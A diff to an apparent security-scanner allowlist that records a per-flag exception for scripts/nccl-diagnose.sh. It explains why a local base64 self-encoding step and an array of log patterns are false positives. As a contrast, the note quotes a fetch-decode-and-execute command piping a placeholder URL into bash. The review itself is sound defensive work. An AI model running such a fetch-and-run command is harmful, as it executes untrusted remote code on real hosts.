@@ -174,6 +174,9 @@
     ],
     "expires": "2026-10-20",
     "reviewedHash": "a22a54fcb17890f3a6f87f2900f256607a42fea98e4c3be0971a863f2a18284c",
+    "reviewedFiles": {
+      "scripts/nccl-diagnose.sh": "db49d192b8749143c44b4580f98a6a545bdea3d2c7059615091ff019ba069259"
+    },
     "class": "encoded transport",
     "note": "Per-flag acceptance (#87) after the whole-skill hash lapsed twice on the SAME two reviewed-benign flags — AWS produced three distinct skill hashes in a few hours on 2026-07-21, and the only file changing upstream is the finding-bearing one, so per-file granularity (#68) would buy nothing. Both flags re-verified against the bytes at catalog pin 153b28e. (1) 'obfuscated payload to shell' — scripts/nccl-diagnose.sh:1499 base64-encodes its OWN locally-built $script_body and decodes it on the remote host at :1500, because AWS-StartNonInteractiveCommand collapses newlines in a single command element; the comment two lines above says exactly that, and nothing is fetched (contrast the real threat shape, curl <url> | base64 -d | bash). (2) 'reads a secret env var' — since the redstamp bump killed the lowercase-$token FP this now matches ${NCCL_PAT_KEYS[...]} at :1049, a local bash array declared at :940 holding NCCL log-error patterns ('Timeout waiting for', 'Connection refused', …). PAT = pattern; nothing is read from the environment. Everything outside nccl-diagnose.sh must still scan clean, a NEW flag re-flags, and this lapses on 2026-10-20.",
     "reviewed": "2026-07-22"
